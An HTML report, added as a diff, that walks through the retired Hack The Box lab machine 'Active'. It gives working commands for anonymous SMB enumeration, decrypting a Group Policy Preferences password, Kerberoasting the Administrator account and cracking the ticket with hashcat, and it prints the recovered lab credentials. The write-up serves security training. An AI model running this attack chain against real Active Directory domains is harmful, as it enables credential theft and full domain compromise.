@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>Active - HTB Report</title>
+    <link rel="stylesheet" href="../style.css">
+  </head>
+
+  <body>
+    <header>
+      <h1>Active</h1>
+      <p>Hack The Box Retired Machine Report</p>
+    </header>
+
+    <main class="report">
+
+      <h2>Machine Info</h2>
+      <p><strong>Difficulty:</strong> Easy to Medium</p>
+      <p><strong>Operating System:</strong> Windows (Active Directory)</p>
+      <p><strong>Status:</strong> Retired</p>
+      <p><strong>Date Started:</strong> 22 June 2026</p>
+      <p><strong>Date Completed:</strong> 22 June 2026</p>
+
+      <h2>Summary</h2>
+      <p>
+        Active is an Active Directory machine that demonstrates two common attack techniques:
+        exploitation of Group Policy Preferences (GPP) to recover credentials and Kerberoasting
+        to escalate privileges to Domain Admin.
+      </p>
+
+      <p>
+        The attack chain starts with anonymous SMB access, leads to credential recovery from
+        a GPP configuration file, and ends with cracking a Kerberos service ticket to obtain
+        Administrator access.
+      </p>
+
+      <h2>Reconnaissance</h2>
+
+      <h3>Nmap Scan</h3>
+      <pre><code>nmap -sC -sV -p- -T4 10.129.19.143 -oA full_scan</code></pre>
+
+      <h3>Open Ports</h3>
+
+      <table class="report-table">
+        <thead>
+          <tr>
+            <th>Port</th>
+            <th>Service</th>
+            <th>Notes</th>
+          </tr>
+        </thead>
+
+        <tbody>
+          <tr>
+            <td>53</td>
+            <td>DNS</td>
+            <td>Microsoft DNS (Active Directory Domain Controller)</td>
+          </tr>
+          <tr>
+            <td>88</td>
+            <td>Kerberos</td>
+            <td>Authentication service</td>
+          </tr>
+          <tr>
+            <td>135</td>
+            <td>MSRPC</td>
+            <td>Windows RPC endpoint mapper</td>
+          </tr>
+          <tr>
+            <td>139</td>
+            <td>NetBIOS</td>
+            <td>Legacy SMB communication</td>
+          </tr>
+          <tr>
+            <td>389</td>
+            <td>LDAP</td>
+            <td>Active Directory LDAP service</td>
+          </tr>
+          <tr>
+            <td>445</td>
+            <td>SMB</td>
+            <td>File sharing enabled</td>
+          </tr>
+          <tr>
+            <td>464</td>
+            <td>Kerberos Password Change</td>
+            <td>kpasswd service</td>
+          </tr>
+          <tr>
+            <td>593</td>
+            <td>RPC over HTTP</td>
+            <td>Microsoft RPC over HTTP</td>
+          </tr>
+          <tr>
+            <td>636</td>
+            <td>LDAPS</td>
+            <td>Secure LDAP (SSL)</td>
+          </tr>
+          <tr>
+            <td>3268</td>
+            <td>Global Catalog LDAP</td>
+            <td>AD Global Catalog</td>
+          </tr>
+          <tr>
+            <td>3269</td>
+            <td>Global Catalog LDAPS</td>
+            <td>Secure Global Catalog</td>
+          </tr>
+          <tr>
+            <td>49152–49158</td>
+            <td>RPC Dynamic Ports</td>
+            <td>Windows dynamic RPC services</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <h2>Enumeration</h2>
+
+      <h3>SMB Anonymous Access</h3>
+      <p>
+        Anonymous SMB login was allowed, revealing several shares including
+        <code>NETLOGON</code>, <code>SYSVOL</code>, and <code>Replication</code>.
+      </p>
+
+      <pre><code>smbclient -L //10.129.19.143 -N</code></pre>
+
+      <h3>Group Policy Preferences (GPP) Credentials</h3>
+      <p>
+        Inside the <code>Replication</code> share, a <code>Groups.xml</code> file was found containing
+        an encrypted password for the user <code>SVC_TGS</code>.
+      </p>
+
+      <pre><code>cpassword: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw...</code></pre>
+
+      <p>The password was decrypted using:</p>
+
+      <pre><code>gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw...</code></pre>
+
+      <p><strong>Recovered Credentials:</strong> SVC_TGS : GPPstillStandingStrong2k18</p>
+
+      <h2>Initial Access</h2>
+
+      <p>
+        Using the recovered credentials, SMB access was obtained to domain shares and the user
+        directory. The <code>user.txt</code> flag was retrieved from the <code>SVC_TGS</code>
+        Desktop.
+      </p>
+
+      <pre><code>smbclient //10.129.19.143/Users -U SVC_TGS</code></pre>
+
+      <h2>Privilege Escalation</h2>
+
+      <h3>Kerberoasting Attack</h3>
+
+      <p>
+        The <code>GetUserSPNs.py</code> tool from Impacket was used to request service tickets
+        for domain accounts.
+      </p>
+
+      <pre><code>GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.19.143 -request</code></pre>
+
+      <p>
+        A Kerberos service ticket for the <code>Administrator</code> account was successfully extracted.
+      </p>
+
+      <h3>Hash Cracking</h3>
+
+      <p>The extracted ticket was cracked using Hashcat:</p>
+
+      <pre><code>hashcat -m 13100 hash.txt rockyou.txt</code></pre>
+
+      <p><strong>Recovered Password:</strong> Ticketmaster1968</p>
+
+      <h2>Root Access</h2>
+
+      <p>
+        Using the cracked Administrator credentials, SMB access was obtained and the
+        <code>root.txt</code> flag was retrieved from the Administrator Desktop.
+      </p>
+
+      <pre><code>smbclient //10.129.19.143/Users -U Administrator</code></pre>
+
+      <h2>Flags</h2>
+
+      <pre><code>user.txt: REDACTED
+root.txt: REDACTED</code></pre>
+
+      <h2>Tools Used</h2>
+      <ul>
+        <li>Nmap</li>
+        <li>smbclient</li>
+        <li>gpp-decrypt</li>
+        <li>Impacket (GetUserSPNs.py)</li>
+        <li>Hashcat</li>
+      </ul>
+
+      <h2>Lessons Learned</h2>
+      <p>
+        This machine demonstrates how legacy Group Policy Preferences can leak credentials and how
+        Kerberoasting can be used to escalate privileges in Active Directory environments.
+        Proper service account password hygiene and disabling legacy GPP mechanisms are critical
+        security controls in AD environments.
+      </p>
+
+      <p><a href="../index.html">Back to all reports</a></p>
+
+    </main>
+  </body>
+</html>
